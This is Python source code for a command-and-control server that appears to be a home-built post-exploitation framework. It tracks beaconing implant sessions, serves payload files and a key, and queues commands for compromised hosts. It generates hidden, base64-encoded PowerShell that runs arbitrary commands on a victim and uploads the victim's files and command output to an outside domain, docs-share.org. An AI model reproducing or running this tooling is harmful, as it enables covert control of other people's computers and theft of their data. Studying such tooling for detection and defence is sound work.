import http.server
import ssl
import sys
import os
import threading
import base64
import readline
import time
from rich.console import Console
from rich.table import Table

console = Console(highlight=False)

banner = """
▙▗▌▞▀▖▌ ▌▞▀▖▛▀▘▀▛▘▛▀▖▞▀▖▛▀▖
▌▘▌▌ ▌▌ ▌▚▄ ▙▄  ▌ ▙▄▘▙▄▌▙▄▘
▌ ▌▌ ▌▌ ▌▖ ▌▌   ▌ ▌▚ ▌ ▌▌  
▘ ▘▝▀ ▝▀ ▝▀ ▀▀▘ ▘ ▘ ▘▘ ▘▘  
"""

HOST = '0.0.0.0'
PORT = 443
CERT_FILE = 'cert.pem'
KEY_FILE = 'key.pem'
PAYLOAD_KEY_FILE = 'key' 

SESSIONS = {}
SESSION_COUNTER = 1
CURRENT_SESSION_ID = None


BEACON_PATH = '/share/wp-content/files/'
RESULTS_PATH = '///results'
UPLOAD_PATH = '/post/data/upload'
INDEX_FILE = 'index.html'
PROMPT = "[medium_purple1]mouse > [/]"
PROMPT_ACTIVE = False
LAST_CMD = ""


class Session:
    def __init__(self, session_id, ip):
        self.id = session_id
        self.ip = ip
        self.last_checkin = time.time()
        self.task_queue = []
        self.cmd_queue = []

    def checkin(self):
        self.last_checkin = time.time()

def get_session_by_ip(ip):
    for s in SESSIONS.values():
        if s.ip == ip:
            return s
    return None


def log(msg):
    if not PROMPT_ACTIVE:
        console.print(msg)
        return

    buf = ""
    try:
        buf = readline.get_line_buffer()
        if buf.strip() == LAST_CMD:
            buf = ""
    except:
        pass
    
    sys.stdout.write("\r\033[K")
    sys.stdout.flush()
    
    console.print(msg, end="")
    
    console.print(f"\n{PROMPT}{buf}", end="")
    sys.stdout.flush()

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == BEACON_PATH:
            client_ip = self.client_address[0]
            session = get_session_by_ip(client_ip)
            
            if not session:
                global SESSION_COUNTER
                session = Session(SESSION_COUNTER, client_ip)
                SESSIONS[SESSION_COUNTER] = session
                SESSION_COUNTER += 1
                log(f"[sky_blue2][+] New session from {client_ip}[/sky_blue2]")
            
            session.checkin()

            if session.task_queue:
                task_file = session.task_queue.pop(0)
                if os.path.exists(task_file):
                    log(f"[grey74][+] Sending task: {task_file}[/grey74]")
                    with open(task_file, "rb") as f:
                        payload = f.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'application/octet-stream')
                    self.send_header('Content-Length', len(payload))
                    self.end_headers()
                    self.wfile.write(payload)
                    return
                else:
                    log(f"[-] Task file not found: {task_file}")

            if session.cmd_queue:
                cmd = session.cmd_queue.pop(0)
                cmd_bytes = cmd.encode('utf-8')
                log(f"[grey74][+] Sending command: {cmd}[/grey74]")
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.send_header('Content-Length', len(cmd_bytes))
                self.end_headers()
                self.wfile.write(cmd_bytes)
                return

            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Length', 0)
            self.end_headers()
            return

        log(f"[grey39][+] Request: {self.path} from {self.client_address[0]}[/grey39]")

        if self.path == '/pages/1/static/file':
            if os.path.exists(PAYLOAD_KEY_FILE):
                log(f"[grey39][+] Serving Key: {PAYLOAD_KEY_FILE}[/grey39]")
                with open(PAYLOAD_KEY_FILE, "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'application/x-pem-file')
                self.send_header('Content-Length', len(data))
                self.end_headers()
                self.wfile.write(data)
                return
            else:
                log(f"[-] Key file not found: {PAYLOAD_KEY_FILE}")
                self.send_error(404, "File not found")
                return

        if self.path == '/':
            if os.path.exists(INDEX_FILE):
                with open(INDEX_FILE, "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-Length', len(content))
                self.end_headers()
                self.wfile.write(content)
                return
            else:
                 self.send_error(404, "Not found")
                 return

        self.send_error(404, "Not found")

    def do_POST(self):
        if self.path == UPLOAD_PATH:
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                file_name = self.headers.get('X-File-Name', 'unknown_file')
                file_data = self.rfile.read(content_length)
                
                client_ip = self.client_address[0]
                session = get_session_by_ip(client_ip)
                session_id = session.id if session else "unknown"
                
                download_dir = f"downloads/{session_id}"
                if not os.path.exists(download_dir):
                    os.makedirs(download_dir)
                    
                file_path = os.path.join(download_dir, os.path.basename(file_name))
                with open(file_path, "wb") as f:
                    f.write(file_data)
                    
                log(f"[sky_blue2][+] Downloaded: {file_name} -> {file_path}[/sky_blue2]")
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', '0')
                self.end_headers()
            except Exception as e:
                if "violation of protocol" not in str(e):
                    log(f"[red][-] Upload failed: {e}[/red]")
            return

        if self.path.endswith('/results'):
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                output = self.rfile.read(content_length)
                try:
                    decoded = output.decode('utf-8', errors='replace')
                except:
                    decoded = str(output)
                
                client_ip = self.client_address[0]
                session = get_session_by_ip(client_ip)
                if session:
                    session.checkin()
                    log(f"\n[bright_white][+] Output:\n{'-'*40}\n{decoded}\n{'-'*40}[/bright_white]")
                else:
                    log(f"\n[bright_white][+] Output:\n{'-'*40}\n{decoded}\n{'-'*40}[/bright_white]")
            
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', '0')
                self.end_headers()
            except Exception:
                 pass
            return

        self.send_error(404, "Not found")

    def log_message(self, format, *args):
        pass

def command_input_thread():
    global PROMPT_ACTIVE, LAST_CMD, CURRENT_SESSION_ID, PROMPT
    print()
    while True:
        try:
            PROMPT_ACTIVE = True
            cmd = console.input(PROMPT).strip()
            PROMPT_ACTIVE = False
            LAST_CMD = cmd
            
            if not cmd:
                continue
                
            parts = cmd.split()
            base_cmd = parts[0].lower()

            if base_cmd == 'q':
                console.print("[*] Shutting down...", style="red")
                os._exit(0)
            
            elif base_cmd == 'sessions':
                table = Table()
                table.add_column("ID", style="sky_blue2", justify="center")
                table.add_column("IP Address", style="plum3")
                table.add_column("Last Checkin", style="green3")
                
                for s_id, s in SESSIONS.items():
                    last_seen = time.time() - s.last_checkin
                    table.add_row(str(s.id), s.ip, f"{last_seen:.1f}s ago")
                console.print(table)
                continue

            elif base_cmd == 'use':
                if len(parts) > 1:
                    try:
                        target_id = int(parts[1])
                        if target_id in SESSIONS:
                            CURRENT_SESSION_ID = target_id
                            PROMPT = f"[medium_purple1]mouse ({target_id}) > [/]"
                        else:
                            console.print("[-] Invalid session ID", style="red")
                    except ValueError:
                         console.print("[-] Please specify a numeric session ID", style="red")
                else:
                    console.print("[-] Usage: use <id>", style="red")
                continue

            elif base_cmd == 'back':
                CURRENT_SESSION_ID = None
                PROMPT = "[medium_purple1]mouse > [/]"
                continue

            if CURRENT_SESSION_ID is None:
                console.print("[-] No session selected.", style="red")
                continue
            
            session = SESSIONS[CURRENT_SESSION_ID]

            if base_cmd == 'task':
                if len(cmd) > 5:
                    task_file = cmd[5:].strip()
                    session.task_queue.append(task_file)
                    console.print(f"[+] Queued task: {task_file}", style="sky_blue2")
                else:
                    console.print("[-] Usage: task <filename>", style="red")
            
            elif base_cmd == 'download':
                if len(parts) > 1:
                    remote_path = cmd[9:].strip()
                    raw_ps = (
                        f'[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; '
                        f'try {{ [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }} catch {{}}; '
                        f'$p="{remote_path}"; '
                        f'$b=[System.IO.File]::ReadAllBytes($p); '
                        f'$wc=New-Object System.Net.WebClient; '
                        f'$wc.Headers.Add("X-File-Name", [System.IO.Path]::GetFileName($p)); '
                        f'$wc.UploadData("https://docs-share.org{UPLOAD_PATH}", $b)'
                    )
                    
                    encoded_cmd = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
                    ps_cmd = f'powershell -nop -w hidden -enc {encoded_cmd}'
                    session.cmd_queue.append(ps_cmd)
                    console.print(f"[+] Queued download: {remote_path}", style="sky_blue2")
                else:
                    console.print("[-] Usage: download <remote_path>", style="red")

            else:
                raw_ps = f'[System.Net.ServicePointManager]::Expect100Continue = $false; $o=({cmd} *>&1 | Out-String); if ([string]::IsNullOrEmpty($o)) {{ $o = " " }}; $b=[System.Text.Encoding]::UTF8.GetBytes($o); iwr https://docs-share.org///results -UseBasicParsing -Method POST -Body $b'
                
                encoded_cmd = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
                ps_cmd = f'powershell -nop -w hidden -enc {encoded_cmd}'
                session.cmd_queue.append(ps_cmd)
                console.print(f"[+] Queued command: {cmd}", style="sky_blue2")

        except EOFError:
            break
        except KeyboardInterrupt:
            console.print(f"\n[*] Stopping...", style="red")
            os._exit(0)

def run():
    server_address = (HOST, PORT)
    httpd = http.server.ThreadingHTTPServer(server_address, C2Handler)
    
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        console.print("="*36, style="grey42")
        console.print(banner, style="red3")
        console.print("="*36, style="grey42")
        console.print(f"[*] Listening on https://{HOST}:{PORT}", style="grey42")
        console.print("[*] Mice will beacon every 10s", style="grey42")
        console.print("="*36, style="grey42")
        sys.stdout.flush()
    else:
        print(f"[!] SSL Certs not found ({CERT_FILE}, {KEY_FILE}). Generating self-signed...")
        os.system(f'openssl req -x509 -newkey rsa:4096 -keyout {KEY_FILE} -out {CERT_FILE} -days 365 -nodes -subj "/CN=docs-share.org" 2>/dev/null')
        if os.path.exists(CERT_FILE):
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            console.print(f"[*] Listening on https://{HOST}:{PORT}", style="bold lime")
            sys.stdout.flush()
        else:
             console.print("[!] Failed to generate certs. Exiting.", style="red")
             return

    input_thread = threading.Thread(target=command_input_thread, daemon=True)
    input_thread.start()

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[*] Stopping", style="red")
        httpd.server_close()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        TASK_QUEUE.append(sys.argv[1])
    run()